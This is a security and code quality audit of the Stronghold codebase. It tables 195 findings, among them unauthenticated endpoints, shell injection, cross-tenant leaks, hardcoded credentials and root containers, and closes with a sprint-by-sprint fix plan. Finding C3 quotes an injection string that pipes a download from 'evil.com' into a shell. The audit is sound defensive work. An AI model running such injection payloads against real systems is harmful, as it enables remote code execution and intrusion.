# Stronghold Mid-Release Code Quality Audit

**Date:** 2026-04-13
**Branch:** `feature/test-quality-audit`
**Scope:** Every file in `src/stronghold/` (251 Python files), `deploy/` (62 Helm/K8s templates), Dockerfiles, CI workflows, pyproject.toml

---

## Executive Summary

| Severity | Count | Top Themes |
|----------|-------|------------|
| **CRITICAL** | 16 | Root containers, unauthenticated endpoints, shell injection, dead security code, hardcoded credentials |
| **HIGH** | 40 | Cross-tenant data leaks, TOCTOU races, missing security enforcement, unpinned images, no Redis error handling |
| **MEDIUM** | 82 | Concurrency, type safety, protocol mismatches, config gaps, performance, logging |
| **LOW** | 57 | Code smells, magic numbers, minor inconsistencies |
| **TOTAL** | **195** | |

---

## CRITICAL Findings (16)

### Security

| # | File:Line | Finding |
|---|-----------|---------|
| C1 | `api/routes/mason.py:51-301` | 7 Mason endpoints have **zero authentication** — anyone can assign issues, trigger reviews, read queue |
| C2 | `api/routes/mason.py:362` | GitHub webhook accepts unsigned payloads when `GITHUB_WEBHOOK_SECRET` is unset |
| C3 | `tools/shell_exec.py:133` | Prefix-only allowlist + `create_subprocess_shell` — `echo hello; curl evil.com \| sh` passes validation |
| C4 | `agents/strategies/react.py:128` | JSON bomb protection is **dead code** — `tool_result` is assigned but overwritten by subsequent code paths |
| C5 | `agents/artificer/strategy.py:144-210` | ArtificerStrategy has **no Sentinel, no Warden, no PII filter** on tool results — complete security bypass vs ReactStrategy |
| C6 | `mcp/oauth/endpoints.py:119` | OAuth authorize auto-approves with user-supplied `user_id`/`tenant_id` — no production guard |

### Infrastructure

| # | File:Line | Finding |
|---|-----------|---------|
| C7 | `Dockerfile:30` | Main container runs as **root** (no `USER` directive) |
| C8 | All 6 deployment templates | `runAsNonRoot: false` with TODO comments |
| C9 | `values.yaml:29` | Hardcoded postgres password `stronghold` in legacy block |
| C10 | `docker-compose.yml:40` | Same hardcoded password repeated in 3 places |
| C11 | `.github/workflows/deploy.yml:68` | SSH deploy runs as `root` on target host |

### Architecture

| # | File:Line | Finding |
|---|-----------|---------|
| C12 | `agents/base.py:149` | `strategy` and 5 other `Agent.__init__` params typed as `Any` — defeats all static analysis |
| C13 | `agents/factory.py:246` | `create_agents()` types all 12 dependency params as `Any` — DI entry point provides zero compile-time guarantees |
| C14 | `agents/base.py:404` | RCA learnings stored via non-traced path lack `org_id`/`team_id` — cross-tenant learning leakage |
| C15 | `agents/store.py:93` | Dynamically-created agents get only 4 of 14+ deps copied — missing Sentinel, learning, tracing, quota |
| C16 | `api/routes/marketplace.py:109` | CSRF check is **unreachable dead code** — `return`/`raise` always exits before `_check_csrf()` |

---

## HIGH Findings (40)

### Security (13)

| # | File:Line | Finding |
|---|-----------|---------|
| H1 | `tools/file_ops.py:67` | Path traversal check uses string prefix — `/workspace/foobar/evil` bypasses check for `/workspace/foo` |
| H2 | `tools/workspace.py:117` | GitHub token embedded in git clone URL — appears in ps, may leak in error messages |
| H3 | `api/routes/dashboard.py:50` | Filename reflected in HTML 404 without escaping — XSS if path params added |
| H4 | `api/routes/agents_stream.py:142` | Raw exception messages sent to client via SSE — leaks internal paths/errors |
| H5 | `api/routes/agents.py:180` | Empty `_agents` dict bypasses org filtering fallback |
| H6 | `conduit.py:646` | Mutates `llm._fallback_models` private attr — not thread-safe, concurrent requests overwrite each other |
| H7 | `auth_jwt.py:117` | `INTERACTIVE_AGENT` identity kind check is dead code — condition can never be True |
| H8 | `auth_jwt.py:186` | JWKS cache refresh has TOCTOU race — multiple tasks can refresh redundantly |
| H9 | `auth_jwt.py:158` | JWKS fetch is blocking I/O in async method — stalls event loop |
| H10 | `security/rate_limiter.py:48` | No locking on shared mutable state — rates can be bypassed under concurrent load |
| H11 | `security/validator.py:137` | Sentinel schema validation fail-open — repair on one field suppresses errors on other fields |
| H12 | `quota/coins.py:298` | TOCTOU race — balance check outside transaction, debit inside — concurrent overdraft possible |
| H13 | `quota/coins.py:192` | Wallet-less users pass `ensure_can_afford` — no user wallet required |

### Cross-Tenant Data Leaks (4)

| # | File:Line | Finding |
|---|-----------|---------|
| H14 | `memory/learnings/embeddings.py:129` | `HybridLearningStore.find_relevant()` drops `org_id` — cross-tenant learning exposure |
| H15 | `memory/learnings/embeddings.py:192` | `check_auto_promotions()` and `get_promoted()` also drop `org_id` |
| H16 | `protocols/memory.py:77` | EpisodicStore protocol uses `team` but impl uses `team_id` — argument silently dropped |
| H17 | `memory/episodic/store.py:27` | GLOBAL scope memories visible to unscoped callers when `caller_org` is empty |

### Infrastructure (10)

| # | File:Line | Finding |
|---|-----------|---------|
| H18 | `cache/prompt_cache.py` | Zero Redis error handling — crash on Redis down |
| H19 | `cache/rate_limiter.py` | Same — rate limiting crashes instead of degrading gracefully |
| H20 | `cache/session_store.py` | Same — sessions crash on Redis down |
| H21 | `prompts/routes.py:49` | Routes access `pm._versions`/`pm._labels` private attrs — will crash with PgPromptManager |
| H22 | `triggers.py:45` | Accesses `rate_limiter._windows` private attr — crashes with RedisRateLimiter |
| H23 | `orchestrator/pipeline.py:263` | Busy-wait polling loop (600 iterations x 1s sleep) — should use asyncio.Event |
| H24 | Deploy templates x6 | `runAsNonRoot: false` on all deployments |
| H25 | `vault-deployment.yaml:121` | Vault TLS disabled — plaintext secrets on pod network |
| H26 | `vault-deployment.yaml:105` | Vault data on emptyDir — wiped on every restart |
| H27 | `vault-deployment.yaml:117` | Vault mlock disabled — secrets can be swapped to disk |

### CI/Docker (6)

| # | File:Line | Finding |
|---|-----------|---------|
| H28 | `ci.yml:58` | `${{ steps.changed.outputs.files }}` injected unquoted into shell — command injection |
| H29 | All Dockerfiles | Unpinned base images (`python:3.12-slim` without digest) |
| H30 | `docker-compose.yml` | 4 services use floating `latest`/`main` tags |
| H31 | No `.dockerignore` | Build context includes .git, tests, docs — bloated images |
| H32 | `k8s/camoufox-fetcher.yaml` | No securityContext, no resource limits, `latest` tag |
| H33 | `statefulset-postgres.yaml:83` | `SETUID`/`SETGID` capabilities granted — privilege escalation vector |

---

## Summary by Domain

| Domain | Critical | High | Medium | Low |
|--------|----------|------|--------|-----|
| Security layer | 0 | 4 | 20 | 8 |
| Agents + strategies | 5 | 6 | 14 | 5 |
| API routes + middleware | 3 | 6 | 10 | 6 |
| Router + classifier + quota | 0 | 3 | 6 | 29 |
| Memory + sessions + types | 0 | 3 | 8 | 8 |
| Infrastructure (MCP, tools, skills, persistence) | 1 | 3 | 12 | 11 |
| Config + tracing + builders + cache | 0 | 5 | 16 | 16 |
| Helm + K8s + Docker + CI | 5 | 13 | 16 | 9 |
| **Total** | **16** | **40** | **82** | **57** |

---

## Recommended Fix Order

### Sprint 1: Security (block exploits)
1. Add auth to Mason endpoints (C1)
2. Reject unsigned webhooks when secret unset (C2)
3. Fix shell_exec — switch to `create_subprocess_exec` or block metacharacters (C3)
4. Fix JSON bomb dead code in ReactStrategy (C4)
5. Add Sentinel/Warden/PII to ArtificerStrategy (C5)
6. Add production guard to OAuth auto-approve (C6)
7. Fix CSRF dead code in marketplace (C16)
8. Fix path traversal string-prefix check (H1)
9. Fix HybridLearningStore org_id forwarding (H14, H15)
10. Fix GLOBAL scope leak for empty caller_org (H17)

### Sprint 2: Infrastructure hardening
1. Dockerfile: add non-root user (C7, C8)
2. Remove hardcoded credentials from values.yaml and docker-compose (C9, C10)
3. Pin all image tags (H29, H30)
4. Add .dockerignore (H31)
5. Add Redis error handling to all 3 cache modules (H18-H20)
6. Fix Vault: TLS, PVC, mlock (H25-H27)
7. Fix CI command injection (H28)

### Sprint 3: Architecture + type safety
1. Replace `Any` with protocols in Agent.__init__ and create_agents (C12, C13)
2. Fix agent store cloning — copy all deps (C15)
3. Fix cross-tenant RCA learning leak (C14)
4. Fix TOCTOU in coin ledger (H12)
5. Fix conduit fallback_models mutation (H6)
6. Replace private attr access in routes/triggers (H21, H22)
7. Fix busy-wait polling in pipeline (H23)

### Sprint 4: Medium severity cleanup
- Concurrency locks on in-memory stores
- Protocol signature alignment (team vs team_id)
- Config validation hardening
- Logging hygiene (credentials, log levels)
- Performance (regex precompilation, connection pooling, DB aggregates)

---

## Automated Tool Findings (pre-existing)

| Tool | Findings | Status |
|------|----------|--------|
| bandit | 28 (skipping B608 in CI) | Fix in Phase 2, then remove `--skip` |
| semgrep | 6 (#1038) | Fix, then gate in CI |
| vulture | 17 (#1035) | Whitelist FPs, fix real unused var |
| xenon | 76 C/D functions (#1036) | Refactor D-rank, gate at B |
| pip-audit | 3 CVEs (aiohttp, cryptography, curl-cffi) | Bump versions |
| mypy | 1 error (conduit.py:112) | Fix Literal type |
